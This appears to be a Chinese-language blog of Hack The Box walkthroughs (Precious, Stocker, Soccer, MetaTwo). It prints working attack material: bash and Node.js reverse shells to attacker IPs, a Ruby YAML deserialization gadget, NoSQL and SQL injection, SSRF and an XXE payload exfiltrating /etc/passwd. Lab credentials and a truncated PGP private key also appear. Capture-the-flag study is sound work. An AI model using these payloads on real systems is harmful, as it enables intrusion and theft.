<h1 id="Precious"><a href="#Precious" class="headerlink" title="Precious"></a>Precious</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220085607881.png" alt="image-20230220085607881"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220085615871.png" alt="image-20230220085615871"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220090251241.png" alt="image-20230220090251241"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220090350689.png" alt="image-20230220090350689"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220092133919.png" alt="image-20230220092133919"></p>
<p>这里尝试 外网地址和127.0.0.1 时都不行</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220092400726.png" alt="image-20230220092400726"></p>
<p>在vpn地址起一个服务</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220092433563.png" alt="image-20230220092433563"></p>
<p>使用exiftool 工具查看下文件的信息</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220152945520.png" alt="image-20230220152945520"></p>
<p>发现可以正常访问 发现将网页转换成了 pdf 文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.10.14.2/?name=#&#123;&#x27;%20`/bin/bash -c &quot;bash -i &amp;&gt; /dev/tcp/10.10.14.2/5555 0&lt;&amp;1&quot;`&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220145207434.png" alt="image-20230220145207434"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220145158056.png" alt="image-20230220145158056"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220182240940.png" alt="image-20230220182240940"></p>
<p>拿到用户名和密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">henry:Q3c1AqGHtoI0aXAYFH</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220182447668.png" alt="image-20230220182447668"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5111c74b6261eca78ba68bbe160f41e2</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220183321398.png" alt="image-20230220183321398"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220183550870.png" alt="image-20230220183550870"></p>
<p>这里可以看到我们可以执行这一条命令 但是其中的ruby脚本是root的 我们无法直接更改获得权限 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220193429338.png" alt="image-20230220193429338"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220193744438.png" alt="image-20230220193744438"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull ruby:2.7.4</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220202015626.png" alt="image-20230220202015626"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it --rm ruby:2.7.4 bash</span><br><span class="line">apt install vim</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220203032393.png" alt="image-20230220203032393"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yaml.rb</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require &quot;yaml&quot;</span><br><span class="line"></span><br><span class="line">YAML.load(File.read(&quot;p.yml&quot;))</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220203245725.png" alt="image-20230220203245725"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">- !ruby/object:Gem::Installer</span><br><span class="line">    i: x</span><br><span class="line">- !ruby/object:Gem::SpecFetcher</span><br><span class="line">    i: y</span><br><span class="line">- !ruby/object:Gem::Requirement</span><br><span class="line">  requirements:</span><br><span class="line">    !ruby/object:Gem::Package::TarReader</span><br><span class="line">    io: &amp;1 !ruby/object:Net::BufferedIO</span><br><span class="line">      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry</span><br><span class="line">         read: 0</span><br><span class="line">         header: &quot;abc&quot;</span><br><span class="line">      debug_output: &amp;1 !ruby/object:Net::WriteAdapter</span><br><span class="line">         socket: &amp;1 !ruby/object:Gem::RequestSet</span><br><span class="line">             sets: !ruby/object:Net::WriteAdapter</span><br><span class="line">                 socket: !ruby/module &#x27;Kernel&#x27;</span><br><span class="line">                 method_id: :system</span><br><span class="line">             git_set: id</span><br><span class="line">         method_id: :resolve</span><br></pre></td></tr></table></figure>

<p>执行之后发现可以运行命令</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220203337587.png" alt="image-20230220203337587"></p>
<p>那么我们使用同样的方式提权</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220205117084.png" alt="image-20230220205117084"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">- !ruby/object:Gem::Installer</span><br><span class="line">    i: x</span><br><span class="line">- !ruby/object:Gem::SpecFetcher</span><br><span class="line">    i: y</span><br><span class="line">- !ruby/object:Gem::Requirement</span><br><span class="line">  requirements:</span><br><span class="line">    !ruby/object:Gem::Package::TarReader</span><br><span class="line">    io: &amp;1 !ruby/object:Net::BufferedIO</span><br><span class="line">      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry</span><br><span class="line">         read: 0</span><br><span class="line">         header: &quot;abc&quot;</span><br><span class="line">      debug_output: &amp;1 !ruby/object:Net::WriteAdapter</span><br><span class="line">         socket: &amp;1 !ruby/object:Gem::RequestSet</span><br><span class="line">             sets: !ruby/object:Net::WriteAdapter</span><br><span class="line">                 socket: !ruby/module &#x27;Kernel&#x27;</span><br><span class="line">                 method_id: :system</span><br><span class="line">             git_set: /bin/bash</span><br><span class="line">         method_id: :resolve</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230220205145958.png" alt="image-20230220205145958"></p>
<h1 id="Stocker"><a href="#Stocker" class="headerlink" title="Stocker"></a>Stocker</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -Pn -T4 -sS 10.10.11.196</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230228193230703.png" alt="image-20230228193230703"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;10.10.11.196 stocker.htb&quot; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;10.10.11.196 dev.stocker.htb&quot; &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>这里在爆破子域名的时候 除非提前加到hosts中否则扫不到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dns -d stocker.htb -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt -t 50</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230302145854243.png" alt="image-20230302145854243"></p>
<p>发现一个基于node.js的登录框</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230302150009240.png" alt="image-20230302150009240"></p>
<p>尝试搜索 nosql 注入</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230302165259882.png" alt="image-20230302165259882"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230302165339388.png" alt="image-20230302165339388"></p>
<p>这里找到 绕过 方法 可以尝试下 发现使用json可以成功绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125; &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230302165456923.png" alt="image-20230302165456923"></p>
<p>成功登录了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230302185758737.png" alt="image-20230302185758737"></p>
<p>这里挨着点点看看</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230302185956784.png" alt="image-20230302185956784"></p>
<p>在点击后请求</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230302190647940.png" alt="image-20230302190647940"></p>
<p>可以发现在这里进行了回显</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230302191027566.png" alt="image-20230302191027566"></p>
<p>把pdf 下载下来 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230302191538682.png" alt="image-20230302191538682"></p>
<p>可以看到是 Skia&#x2F;PDF m10 </p>
<p>接着搜一下</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230302205756060.png" alt="image-20230302205756060"></p>
<p>简单看一下就是 如果能够在返回的pdf 中插入字符的话可以通过 构造iframe 来进行ssrf</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230302210016297.png" alt="image-20230302210016297"></p>
<p>构造ssrf</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230302210159371.png" alt="image-20230302210159371"></p>
<p>这里首先去读取 nginx 配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&#x27;/etc/nginx/nginx.conf&#x27; height=1050px width=800px&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p>得到 应用根路径</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230302222720736.png" alt="image-20230302222720736"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230303132507974.png" alt="image-20230303132507974"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230303132522002.png" alt="image-20230303132522002"></p>
<p>那这个密码尝试登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dev:IHeardPassphrasesArePrettySecure</span><br></pre></td></tr></table></figure>

<p>这里再次回去查看 &#x2F;etc&#x2F;passwd 文件发现 mongodb 是无法登录的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230303132254245.png" alt="image-20230303132254245"></p>
<p>尝试登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">angoose:IHeardPassphrasesArePrettySecure</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230303132640264.png" alt="image-20230303132640264"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230303132827589.png" alt="image-20230303132827589"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230303132839366.png" alt="image-20230303132839366"></p>
<p>可以看到 可以在 scripts目录下执行任意js文件 但是这里存在目录穿越 也就是可以执行其他目录的js文件</p>
<p>首先我们写一个 node.js 的shell</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>),</span><br><span class="line">        sh = cp.<span class="title function_">spawn</span>(<span class="string">&quot;/bin/bash&quot;</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.<span class="title class_">Socket</span>();</span><br><span class="line">    client.<span class="title function_">connect</span>(<span class="number">5555</span>, <span class="string">&quot;10.10.14.33&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        client.<span class="title function_">pipe</span>(sh.<span class="property">stdin</span>);</span><br><span class="line">        sh.<span class="property">stdout</span>.<span class="title function_">pipe</span>(client);</span><br><span class="line">        sh.<span class="property">stderr</span>.<span class="title function_">pipe</span>(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>; <span class="comment">// Prevents the Node.js application from crashing</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/s.js</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230303135946766.png" alt="image-20230303135946766"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230303140007087.png" alt="image-20230303140007087"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230303140120397.png" alt="image-20230303140120397"></p>
<h1 id="Soccer"><a href="#Soccer" class="headerlink" title="Soccer"></a>Soccer</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230303141751291.png" alt="image-20230303141751291"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230303141907836.png" alt="image-20230303141907836"></p>
<p>扫描到这个目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt  -u http://soccer.htb/ -t 50</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230303145010961.png" alt="image-20230303145010961"></p>
<p>发现程序名字</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230303145214056.png" alt="image-20230303145214056"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230303145159184.png" alt="image-20230303145159184"></p>
<p>读一下 发现需要登录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230303144921596.png" alt="image-20230303144921596"></p>
<p>这里弱口令出密码 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230304122130074.png" alt="image-20230304122130074"></p>
<p>发现可以上传php文件 这里传一个 phpshell</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230304122121706.png" alt="image-20230304122121706"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230304122150780.png" alt="image-20230304122150780"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230304125505036.png" alt="image-20230304125505036"></p>
<p>看到有一个3306</p>
<p>这里找到还有一个域名</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230304123645185.png" alt="image-20230304123645185"></p>
<p>这里通过查看nginx配置文件可以发现 确实还有一个 服务在3000端口</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230304125823481.png" alt="image-20230304125823481"></p>
<p>添加到本地hosts之后依次请求一下 发现存在 websocket</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230304133918006.png" alt="image-20230304133918006"></p>
<p>经过测试发现存在数字型的 sql注入</p>
<p>这里我们尝试使用 sqlmap来进行注入 注入之前需要进行一下操作 原理可以看下面的文章</p>
<p><a target="_blank" rel="noopener" href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html</a></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230304144137045.png" alt="image-20230304144137045"></p>
<p>这里可以看到ws的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> SimpleHTTPRequestHandler</span><br><span class="line"><span class="keyword">from</span> socketserver <span class="keyword">import</span> TCPServer</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote, urlparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span>  websocket <span class="keyword">import</span> create_connection</span><br><span class="line">ws_server = <span class="string">&quot;ws://soc-player.soccer.htb:9091&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_ws</span>(<span class="params">payload</span>):</span><br><span class="line">    ws = create_connection(ws_server)</span><br><span class="line">    mssage = unquote(payload).replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>)</span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;id&quot;:&quot;%s&quot;&#125;&#x27;</span> % mssage</span><br><span class="line">    ws.send(data)</span><br><span class="line">    resp = ws.recv()</span><br><span class="line">    ws.close()</span><br><span class="line">    <span class="keyword">if</span> resp:</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">middleware_server</span>(<span class="params">host_port,content_type=<span class="string">&quot;text/plain&quot;</span></span>):</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">CustomHandler</span>(<span class="title class_ inherited__">SimpleHTTPRequestHandler</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">            self.send_response(<span class="number">200</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                payload = urlparse(self.path).query.split(<span class="string">&#x27;=&#x27;</span>,<span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">except</span> IndexError:</span><br><span class="line">                payload = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> payload:</span><br><span class="line">                content = send_ws(payload)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                content = <span class="string">&quot;No parameters specified!&quot;</span></span><br><span class="line">            self.send_header(<span class="string">&quot;Content-type&quot;</span>,content_type)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(content.encode())</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">_TCPServer</span>(<span class="title class_ inherited__">TCPServer</span>):</span><br><span class="line">        allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    httpd = _TCPServer(host_port,CustomHandler)</span><br><span class="line">    httpd.serve_forever()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Starting MiddleWare Server&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Send payloads in http://localhost:8081/?id=*&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    middleware_server((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">8081</span>))</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230304174616453.png" alt="image-20230304174616453"></p>
<p>注意使用正确的id</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230304180635855.png" alt="image-20230304180635855"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305144323106.png" alt="image-20230305144323106"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305151358835.png" alt="image-20230305151358835"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305151110091.png" alt="image-20230305151110091"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">player:PlayerOftheMatch2022</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305151557679.png" alt="image-20230305151557679"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305151630391.png" alt="image-20230305151630391"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305154527450.png" alt="image-20230305154527450"></p>
<p>这里可以看到开头有一个doas命令  这个命令用来代替 sudo执行 root命令的 可以看到配置文件是 doas.conf</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305154821077.png" alt="image-20230305154821077"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305154928865.png" alt="image-20230305154928865"></p>
<p>这里写了可以使用 root权限 无密码执行dstat命令</p>
<p>dstat 命令可以通过编写插件来执行任意脚本</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305155057603.png" alt="image-20230305155057603"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&quot;bash -i&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305155338269.png" alt="image-20230305155338269"></p>
<h1 id="MetaTwo"><a href="#MetaTwo" class="headerlink" title="MetaTwo"></a>MetaTwo</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305173449730.png" alt="image-20230305173449730"></p>
<p>ftp 登录失败</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305175256862.png" alt="image-20230305175256862"></p>
<p>wordpress的站</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305173031493.png" alt="image-20230305173031493"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan  --url http://metapress.htb/ -e ap</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305180322772.png" alt="image-20230305180322772"></p>
<p>这里去扫了一下发现版本是  5.6.2  php 版本  PHP&#x2F;8.0.24</p>
<p>发现一个插件 bookingpress</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305180638655.png" alt="image-20230305180638655"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305180723069.png" alt="image-20230305180723069"></p>
<p>可以看到版本号是 小于 1.0.11 这里的版本号是1.0.10</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305181239396.png" alt="image-20230305181239396"></p>
<p>大概理解一下就是需要通过 admin-ajax.php发送请求 在total_service参数中存在注入</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305181229588.png" alt="image-20230305181229588"></p>
<p>这里随便点点</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305181221434.png" alt="image-20230305181221434"></p>
<p>这里注意将 _wpnonce 进行替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap --batch -u http://metapress.htb/wp-admin/admin-ajax.php --data=&quot;action=bookingpress_front_get_category_services&amp;_wpnonce=4b283709e3&amp;category_id=1&amp;total_service=1&quot; -p &quot;total_service&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305184922999.png" alt="image-20230305184922999"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305184953570.png" alt="image-20230305184953570"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305185022096.png" alt="image-20230305185022096"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305185110517.png" alt="image-20230305185110517"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305190006597.png" alt="image-20230305190006597"></p>
<p>第一个没跑到第二个 跑到了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">manager:partylikearockstar</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305190115041.png" alt="image-20230305190115041"></p>
<p>可以看到权限不多 在小于5.7时存在一个xxe </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230305190517862.png" alt="image-20230305190517862"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/motikan2010/CVE-2021-29447</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo -en &#x27;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#x27;&quot;&#x27;&quot;&#x27;http://10.10.16.24:8000/evil.dtd&#x27;&quot;&#x27;&quot;&#x27;&gt;%remote;%init;%trick;] &gt;\x00&#x27;&gt; malicious.wav</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306133205908.png" alt="image-20230306133205908"></p>
<p>生成 malicious.wav </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim evil.dtd</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#x27;http://10.10.16.24:8000/?p=%file;&#x27;&gt;&quot; &gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306133252844.png" alt="image-20230306133252844"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306133909086.png" alt="image-20230306133909086"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306133934167.png" alt="image-20230306133934167"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306135427957.png" alt="image-20230306135427957"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306135437990.png" alt="image-20230306135437990"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306142108321.png" alt="image-20230306142108321"></p>
<p>这里拿到了 ftp的用户名和密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">metapress.htb:9NYS_ii@FyL_p5M2NvJ</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306142214188.png" alt="image-20230306142214188"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306142317237.png" alt="image-20230306142317237"></p>
<p>拿到 jnelson的密码</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306142357133.png" alt="image-20230306142357133"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jnelson:Cb4_JmWM8zUZWMu@Ys</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306143418912.png" alt="image-20230306143418912"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20230306150501655.png" alt="image-20230306150501655"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;-----BEGIN PGP PRIVATE KEY BLOCK-----</span><br><span class="line"></span><br><span class="line">lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1</span><br><span class="line">AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD</span><br><span class="line">/GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho</span><br><span class="line">3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpT</span><br><span class="line">ZjMvyXe5NeC7JhBCKh+/Wqc4xyBcwhDdW+WU54vuFUthn+PUubEN1m+s13BkyvHV</span><br><span class="line">gNAM4v6terRItXdKvgvHtJxE0vhlNSjFAedACHC4sN+dRqFu4li8XPIVYGkuK9pX</span><br><span class="line">5xA6Nj+8UYRoZrP4SYtaDslT63ZaLd2MvwP+xMw2XEv8Uj3TGq6BIVWmajbsqkEp</span><br><span class="line">tQkU7d+nPt1aw2sA265vrIzry02NAhxL9YQGNJmXFbZ0p8cT3CswedP8XONmVdxb</span><br><span class="line">a1UfdG+soO3jtQsBAKbYl2yF/+D81v+42827iqO6gqoxHbc/0epLqJ+Lbl8hC/sG</span><br><span 